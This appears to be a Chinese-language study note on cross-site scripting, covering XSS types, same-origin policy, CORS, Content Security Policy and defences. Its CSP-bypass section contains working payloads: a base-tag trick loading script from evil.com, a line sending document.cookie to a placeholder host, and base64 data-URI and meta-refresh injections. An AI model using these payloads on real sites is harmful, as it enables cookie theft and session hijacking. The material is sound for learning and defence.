---

title: xss

date: 2023-12-26 02:01:50

tags:

---

xss

------



[TOC]

<!--more-->

# xss分类

## 1.反射型XSS

```php+HTML
反射型XSS是比较常见和广泛的一类，举例来说，当一个网站的代码中包含类似下面的语句：
<?php echo "<p>hello, $_GET['user']</p>";?> ，
那么在访问时设置 
	/?user=</p><script>alert("hack")</script><p> ，
    则可执行预设好的JavaScript代码。

反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor、NoScript等防御手段的影响较大。
```

## 2.储存型xss

```
储存型XSS相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。
```

## 3.dom xss

```html
DOM型XSS不同之处在于DOM型XSS一般和服务器的解析响应没有直接关系，而是在JavaScript脚本动态执行的过程中产生的。

例如：

<html>
<head>
<title>DOM Based XSS Demo</title>
<script>
function xsstest()
{
    var str = document.getElementById("input").value;
    document.getElementById("output").innerHTML = "<img src='"+str+"'></img>";
}
</script>
</head>
<body>
<div id="output"></div>
<input type="text" id="input" size=50 value="" />
<input type="button" value="submit" onclick="xsstest()" />
</body>
</html>
```

## 4.Blind XSS

Blind XSS是储存型XSS的一种，它保存在某些存储中，当一个“受害者”访问这个页面时执行，并且在文档对象模型(DOM)中呈现payload。 它被称为Blind的原因是因为它通常发生在通常不暴露给用户的功能上。

# xss作用

存在XSS漏洞时，可能会导致以下几种情况：

1. 用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。
2. 攻击者能够在一定限度内记录用户的键盘输入。
3. 攻击者通过CSRF等方式以用户身份执行危险操作。
4. XSS蠕虫。
5. 获取用户浏览器信息。
6. 利用XSS漏洞扫描用户内网。





# 同源策略

## 简介

同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。 是否同源由URL决定，URL由协议、域名、端口和路径组成，如果两个URL的协议、域名和端口相同，则表示他们同源。

###  file域的同源策略

在之前的浏览器中，任意两个file域的URI被认为是同源的。本地磁盘上的任何HTML文件都可以读取本地磁盘上的任何其他文件。

从Gecko 1.9开始，文件使用了更细致的同源策略，只有当源文件的父目录是目标文件的祖先目录时，文件才能读取另一个文件。

###  cookie的同源策略

cookie使用不同的源定义方式，一个页面可以为本域和任何父域设置cookie，只要是父域不是公共后缀(public suffix)即可。

不管使用哪个协议(HTTP/HTTPS)或端口号，浏览器都允许给定的域以及其任何子域名访问cookie。设置 cookie时，可以使用 `domain` / `path` / `secure` 和 `http-only` 标记来限定其访问性。

所以 `https://localhost:8080/` 和 `http://localhost:8081/` 的Cookie是共享的。

### Flash/SilverLight跨域

浏览器的各种插件也存在跨域需求。通常是通过在服务器配置crossdomain.xml，设置本服务允许哪些域名的跨域访问。

客户端会请求此文件，如果发现自己的域名在访问列表里，就发起真正的请求，否则不发送请求。

###  源的更改

同源策略认为域和子域属于不同的域，例如 `child1.a.com` 与 `a.com` / `child1.a.com` 与 `child2.a.com` / `xxx.child1.a.com` 与 `child1.a.com` 两两不同源。

对于这种情况，可以在两个方面各自设置 `document.domain='a.com'` 来改变其源来实现以上任意两个页面之间的通信。

另外因为浏览器单独保存端口号，这种赋值会导致端口号被重写为 `null` 。

# 跨源访问

同源策略控制了不同源之间的交互，这些交互通常分为三类：

## 通常允许跨域写操作(Cross-origin writes)

- 链接(links)重定向表单提交

- 通常允许跨域资源嵌入(Cross-origin embedding)
- 通常不允许跨域读操作(Cross-origin reads)

可能嵌入跨源的资源的一些示例有：

- `<script src="..."></script>` 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。
- `<link rel="stylesheet" href="...">` 标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的Content-Type 消息头。
- `<img>` / `<video>` / `<audio>` 嵌入多媒体资源。
- `<object>` `<embed>` 和 `<applet>` 的插件。
- `@font-face` 引入的字体。一些浏览器允许跨域字体( cross-origin fonts)，一些需要同源字体(same-origin fonts)。
- `<frame>` 和 `<iframe>` 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。







## JSONP跨域

JSONP就是利用 `<script>` 标签的跨域能力实现跨域数据的访问，请求动态生成的JavaScript脚本同时带一个callback函数名作为参数。

服务端收到请求后，动态生成脚本产生数据，并在代码中以产生的数据为参数调用callback函数。

JSONP也存在一些安全问题，例如当对传入/传回参数没有做校验就直接执行返回的时候，会造成XSS问题。没有做Referer或Token校验就给出数据的时候，可能会造成数据泄露。

另外JSONP在没有设置callback函数的白名单情况下，可以合法的做一些设计之外的函数调用，引入问题。这种攻击也被称为SOME攻击。

## 跨源脚本API访问

Javascript的APIs中，如 `iframe.contentWindow` , `window.parent`, `window.open` 和 `window.opener` 允许文档间相互引用。当两个文档的源不同时，这些引用方式将对 `window` 和 `location` 对象的访问添加限制。

`window` 允许跨源访问的方法有

- window.blur
- window.close
- window.focus
- window.postMessage

`window` 允许跨源访问的属性有

- window.closed
- window.frames
- window.length
- window.location
- window.opener
- window.parent
- window.self
- window.top
- window.window

其中 `window.location` 允许读/写，其他的属性只允许读

## 跨源数据存储访问

存储在浏览器中的数据，如 `localStorage` 和 `IndexedDB`，以源进行分割。每个源都拥有自己单独的存储空间，一个源中的Javascript脚本不能对属于其它源的数据进行读写操作。

## CORS

CORS是一个W3C标准，全称是跨域资源共享(Cross-origin resource sharing)。通过这个标准，可以允许浏览器读取跨域的资源。

## 常见请求头

- - Origin

    预检请求或实际请求的源站URI, 浏览器请求默认会发送该字段`Origin: <origin>`

- - Access-Control-Request-Method

    声明请求使用的方法`Access-Control-Request-Method: <method>`

- - Access-Control-Request-Headers

    声明请求使用的header字段`Access-Control-Request-Headers: <field-name>[, <field-name>]*`
    



##  常见返回头



- - Access-Control-Allow-Origin

    声明允许访问的源外域URI对于携带身份凭证的请求不可使用通配符 `*``Access-Control-Allow-Origin: <origin> | *`

- - Access-Control-Expose-Headers

    声明允许暴露的头e.g. `Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header`

- - Access-Control-Max-Age

    声明Cache时间`Access-Control-Max-Age: <delta-seconds>`

- - Access-Control-Allow-Credentials

    声明是否允许在请求中带入`Access-Control-Allow-Credentials: true`

- - Access-Control-Allow-Methods

    声明允许的访问方式`Access-Control-Allow-Methods: <method>[, <method>]*`

- - Access-Control-Allow-Headers

    声明允许的头`Access-Control-Allow-Headers: <field-name>[, <field-name>]*`





## 阻止跨源访问

阻止跨域写操作，可以检测请求中的 `CSRF token` ，这个标记被称为Cross-Site Request Forgery (CSRF) 标记。

阻止资源的跨站读取，因为嵌入资源通常会暴露信息，需要保证资源是不可嵌入的。但是多数情况下浏览器都不会遵守 `Content-Type` 消息头。例如如果在HTML文档中指定 `<script>` 标记，则浏览器会尝试将HTML解析为JavaScript。



# csp

Content Security Policy，简称 CSP，译作内容安全策略。顾名思义，这个规范与内容安全有关，主要是用来定义哪些资源可以被当前页面加载，减少 XSS 的发生。



## 配置

CSP策略可以通过 HTTP 头信息或者 meta 元素定义。

CSP 有三类：

- Content-Security-Policy (Google Chrome)
- X-Content-Security-Policy (Firefox)
- X-WebKit-CSP (WebKit-based browsers, e.g. Safari)

```
HTTP header :
"Content-Security-Policy:" 策略
"Content-Security-Policy-Report-Only:" 策略
```

HTTP Content-Security-Policy 头可以指定一个或多个资源是安全的，而Content-Security-Policy-Report-Only则是允许服务器检查（非强制）一个策略。多个头的策略定义由优先采用最先定义的。

HTML Meta :

```
<meta http-equiv="content-security-policy" content="策略">
<meta http-equiv="content-security-policy-report-only" content="策略">
```



###  指令说明

| 指令        | 说明                                                |
| ----------- | --------------------------------------------------- |
| default-src | 定义资源默认加载策略                                |
| connect-src | 定义 Ajax、WebSocket 等加载策略                     |
| font-src    | 定义 Font 加载策略                                  |
| frame-src   | 定义 Frame 加载策略                                 |
| img-src     | 定义图片加载策略                                    |
| media-src   | 定义 <audio>、<video> 等引用资源加载策略            |
| object-src  | 定义 <applet>、<embed>、<object> 等引用资源加载策略 |
| script-src  | 定义 JS 加载策略                                    |
| style-src   | 定义 CSS 加载策略                                   |
| base-uri    | 定义 <base> 根URL策略，不使用default-src作为默认值  |
| sandbox     | 值为 allow-forms，对资源启用 sandbox                |
| report-uri  | 值为 /report-uri，提交日志                          |



### 4.2.4.2.2. 关键字

- - `-`

    允许从任意url加载，除了 `data:` `blob:` `filesystem:` `schemes`e.g. `img-src -`

- - `none`

    禁止从任何url加载资源e.g. `object-src 'none'`

- - `self`

    只可以加载同源资源e.g. `img-src 'self'`

- - `data:`

    可以通过data协议加载资源e.g. `img-src 'self' data:`

- - `domain.example.com`

    e.g. `img-src domain.example.com`只可以从特定的域加载资源

- - `\*.example.com`

    e.g. `img-src \*.example.com`可以从任意example.com的子域处加载资源

- - `https://cdn.com`

    e.g. `img-src https://cdn.com`只能从给定的域用https加载资源

- - `https:`

    e.g. `img-src https:`只能从任意域用https加载资源

- - `unsafe-inline`

    允许内部资源执行代码例如style attribute,onclick或者是sicript标签e.g. `script-src 'unsafe-inline'`

- - `unsafe-eval`

    允许一些不安全的代码执行方式，例如js的eval()e.g. `script-src 'unsafe-eval'`

- - `nonce-<base64-value>'`

    使用随机的nonce，允许加载标签上nonce属性匹配的标签e.g. `script-src 'nonce-bm9uY2U='`

- - `<hash-algo>-<base64-value>'`

    允许hash值匹配的代码块被执行e.g. `script-src 'sha256-<base64-value>'`
    
    

### 4.2.4.2.3. 配置范例

允许执行内联 JS 代码，但不允许加载外部资源

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';

```





## Bypass

### 预加载

浏览器为了增强用户体验，让浏览器更有效率，就有一个预加载的功能，大体是利用浏览器空闲时间去加载指定的内容，然后缓存起来。这个技术又细分为DNS-prefetch、subresource、prefetch、preconnect、prerender。

HTML5页面预加载是用link标签的rel属性来指定的。如果csp头有unsafe-inline，则用预加载的方式可以向外界发出请求，例如

```
<!-- 预加载某个页面 -->
<link rel='prefetch' href='http://xxxx'><!-- firefox -->
<link rel='prerender' href='http://xxxx'><!-- chrome -->
<!-- 预加载某个图片 -->
<link rel='prefetch' href='http://xxxx/x.jpg'>
<!-- DNS 预解析 -->
<link rel="dns-prefetch" href="http://xxxx">
<!-- 特定文件类型预加载 -->
<link rel='preload' href='//xxxxx/xx.js'><!-- chrome -->
```

另外，不是所有的页面都能够被预加载，当资源类型如下时，将阻止预加载操作：

- URL中包含下载资源
- 页面中包含音频、视频
- POST、PUT和DELET操作的ajax请求
- HTTP认证
- HTTPS页面
- 含恶意软件的页面
- 弹窗页面
- 占用资源很多的页面
- 打开了chrome developer tools开发工具



### MIME sniff

举例来说，csp禁止跨站读取脚本，但是可以跨站读img，那么传一个含有脚本的img，再``<script href='http://xxx.com/xx.jpg'>``，这里csp认为是一个img，绕过了检查，如果网站没有回正确的mime type，浏览器会进行猜测，就可能加载该img作为脚本



### 302跳转

对于302跳转绕过CSP而言，实际上有以下几点限制：

- 跳板必须在允许的域内。
- 要加载的文件的host部分必须跟允许的域的host部分一致



### iframe

当可以执行代码时，可以创建一个源为 `css` `js` 等静态文件的frame，在配置不当时，该frame并不存在csp，则在该frame下再次创建frame，达到bypass的目的。同理，使用 `../../../` `/%2e%2e%2f` 等可能触发服务器报错的链接也可以到达相应的目的。



###  base-uri

当script-src为nonce或无限制，且base-uri无限制时，可通过 `base` 标签修改根URL来bypass，如下加载了http://evil.com/main.js

```js
<base href="http://evil.com/">
<script nonce="correct value" src="/main.js"></script>
```



###  其他

- location 绕过

- 可上传SVG时，通过恶意SVG绕过同源站点

- 存在CRLF漏洞且可控点在CSP上方时，可以注入HTTP响应中影响CSP解析

- CND Bypass，如果网站信任了某个CDN, 那么可利用相应CDN的静态资源bypass

- Angular versions <1.5.9 >=1.5.0，存在漏洞 [Git Pull Request](https://github.com/angular/angular.js/pull/15346)

- - jQuery sourcemap

    `document.write(`<script> //@        sourceMappingURL=http://xxxx/`+document.cookie+`<\/script>`);`` `

- a标签的ping属性

- For FireFox `<META HTTP-EQUIV="refresh" CONTENT="0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=">`

- `<link rel="import" />`

- `<meta http-equiv="refresh" content="0; url=http://...." />`

- - 仅限制 `script-src` 时：

    `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>`



# XSS数据源

## URL

- `location`
- `location.href`
- `location.pathname`
- `location.search`
- `location.hash`
- `document.URL`
- `document.documentURI`
- `document.baseURI`



## Navigation

- `window.name`
- `document.referrer`



## Communication

- `Ajax`
- `Fetch`
- `WebSocket`
- `PostMessage`



## Storage

- `Cookie`
- `LocalStorage`
- `SessionStorage`

# Sink

## 执行JavaScript

- `eval(payload)`

- `setTimeout(payload, 100)`

- `setInterval(payload, 100)`

- `Function(payload)()`

- `<script>payload</script>`

- `<img src=x onerror=payload>`

  

## 加载URL

- `location=javascript:alert(/xss/)`
- `location.href=javascript:alert(/xss/)`
- `location.assign(javascript:alert(/xss/))`
- `location.replace(javascript:alert(/xss/))`



## 执行HTML

- `xx.innerHTML=payload`
- `xx.outerHTML=payload`
- `document.write(payload)`
- `document.writeln(payload)`



# xss保护

## HTML过滤

使用一些白名单或者黑名单来过滤用户输入的HTML，以实现过滤的效果。例如DOMPurify等工具都是用该方式实现了XSS的保护。

## X-Frame

X-Frame-Options 响应头有三个可选的值：

- - DENY

    页面不能被嵌入到任何iframe或frame中

- - SAMEORIGIN

    页面只能被本站页面嵌入到iframe或者frame中

- - ALLOW-FROM

    页面允许frame或frame加载

## XSS保护头

基于 Webkit 内核的浏览器(比如Chrome)在特定版本范围内有一个名为XSS auditor的防护机制，如果浏览器检测到了含有恶意代码的输入被呈现在HTML文档中，那么这段呈现的恶意代码要么被删除，要么被转义，恶意代码不会被正常的渲染出来。

而浏览器是否要拦截这段恶意代码取决于浏览器的XSS防护设置。

要设置浏览器的防护机制，则可使用X-XSS-Protection字段 该字段有三个可选的值

- `0` : 表示关闭浏览器的XSS防护机制
- `1` : 删除检测到的恶意代码， 如果响应报文中没有看到 X-XSS-Protection 字段，那么浏览器就认为X-XSS-Protection配置为1，这是浏览器的默认设置
- `1; mode=block` : 如果检测到恶意代码，在不渲染恶意代码

FireFox没有相关的保护机制，如果需要保护，可使用NoScript等相关插件。



